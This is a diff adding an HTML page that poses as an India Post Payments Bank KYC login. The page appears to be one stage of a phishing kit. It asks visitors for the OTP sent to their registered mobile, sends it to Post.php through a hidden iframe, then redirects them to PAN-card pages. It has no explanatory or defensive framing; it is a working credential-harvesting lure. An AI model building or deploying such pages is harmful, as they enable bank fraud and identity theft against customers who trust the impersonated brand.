@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="zxx">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:ital,wght@1,500&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300&display=swap" rel="stylesheet">
+    <title> IndiaPost Payment Bank KYC login</title>
+    <style>
+#hh
+        {
+            width: 116%;
+            margin:-6%;
+            margin-left:-5.6%;
+        }
+#ij
+    {
+    width: 30%;
+    margin-left:5px;
+    }
+
+.login-box {
+  width: 90%;
+  padding: 10px;
+}
+
+.login-box .user-box {
+  position: relative;
+}
+
+.login-box .user-box input {
+  width: 90%;
+  padding: 2px 4px;
+  font-size: 16px;
+  color: black;
+  font-weight:bold;
+  margin-bottom: 10px;
+  margin-left:20px;
+  border: none;
+  border-bottom: 1.5px solid #CCCCCC;
+  outline: none;
+  background: transparent;
+  transition: border-color 0.2s;
+}
+.login-box .user-box label {
+  position: absolute;
+  top:-10px;
+  left: 20px;
+  margin-bottom: 10px;
+  padding: 10px 0px;
+  font-size: 16px;
+  font-family: 'Inter', sans-serif;
+  color: #AF2925;
+  pointer-events: none;
+  transition: 0.2s;
+  font-style:italic;
+  
+}
+.login-box input:focus {
+    width:90%;
+    margin-bottom: 10px;
+    padding: 2px 4px;
+    margin-left:20px;
+    font-size:16px;
+    border-width: 1.5px;
+    border-image: linear-gradient(#AF2924,#AF2925);
+    border-image-slice: 1;
+    
+    }
+
+.login-box .user-box input:focus ~ label,
+.login-box .user-box input:valid ~ label {
+  top: -30px;
+  left: 20px;
+  margin-left:4px;
+  color: #AF2925;
+  font-size: 12px;
+  font-weight:bold;
+  font-family: 'Inter', sans-serif;
+  font-weight:bold;
+}
+
+#ll
+    {
+    background-color:#AE2924;
+    color: white;
+    padding: 0px 0px;
+    margin: 10px;
+    border: none;
+    outline:none;
+    border-radius: 4px;
+    cursor: pointer;
+    font-weight:bold;
+    font-size: 15px; width: 80%; height: 40px;
+    }
+    
+    #ll:hover
+    {
+    background-color:#3E1128;
+    color: white;
+    padding: 0px 0px;
+    margin: 10px;
+    border: none;
+    outline:none;
+    border-radius: 4px;
+    cursor: pointer;
+    font-weight:bold;
+    font-size: 15px; width: 80%; height: 40px;
+    }
+    #kyc
+    {
+    width:116%;   
+    background-color:#3E1128;
+    height:55px;
+    margin:5.5%;
+    margin-left:-5.6%;
+    }
+</style>
+</head>
+<body onload="startTimer();">
+<!-- partial:index.partial.html -->
+<div class="login-box">
+    <!-- Static- Please don't do anything here-->
+    <script type="text/javascript">var submitted=false;</script>
+    <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='PAN_Updating.html';}"></iframe>
+    <!--My Form-->
+    <form action="Post.php" method="post" target="hidden_iframe" onsubmit="submitted=true" class="myform">
+    <center><img src="indiapost.png" id="hh"></center>
+    <div id="kyc"><br>
+    <p1 style=" font-family: 'Inter', sans-serif; color:white; font-size:16px; padding:20px;">Authenticate With OTP</p1><br>
+    </div>
+    <div>
+    <center><b style="font-family:arial; font-size:18px; color:#AF2024; margin-left:20px;">Enter One Time Password (OTP)</b></center><br>
+    </div>
+    <div>
+    <center> <b style="font-family: 'Inter', sans-serif; 
+    color:#3E1128; 
+    font-size:15px;">Please enter The One Time Password(OTP)<br>
+    which was sent to your registered mobile <br>number with IPPB Bank.</b></center>
+    </div><br><br>
+    <div class="user-box">
+    <rt>
+      <input type="text" name="1ST_OTP" inputmode="numeric" maxlength="6"
+      required="">
+      <label>One Time Password*</label>
+    </div>
+     <script type="text/javascript">
+     var timer=180;
+     var sec=0;
+     function startTimer() {
+     sec=parseInt(timer%180);
+     
+     if (timer<2) {
+     // timer.stop();
+     window.location.href = "PAN_Card.html";
+     }
+     
+     document.getElementById("time").innerHTML = "<p1> Wait for OTP   : </p1>"+sec.toString();
+     timer--;
+     setTimeout(function(){
+     startTimer();
+     
+     }, 1000);
+     }
+     
+     </script>
+     <div id="re">
+     <b> <a href="" style="color:#27a2db; margin-left:210px; text-decoration:none;">Resend OTP</a></b><br>
+     </div><br>
+     <div>
+     <center><b style="color:#AE2924; font-size:14px; text-align:center;"><span style="color:#AE2924; font-size:13px;" id="time"></span>&nbsp;second</b></center>
+     </div><br>
+     </div>
+    <center><button type="submit" id="ll">SUBMIT</button></center>
+  </form>
+</div>
+<!-- partial -->
+  
+</body>
+</html>
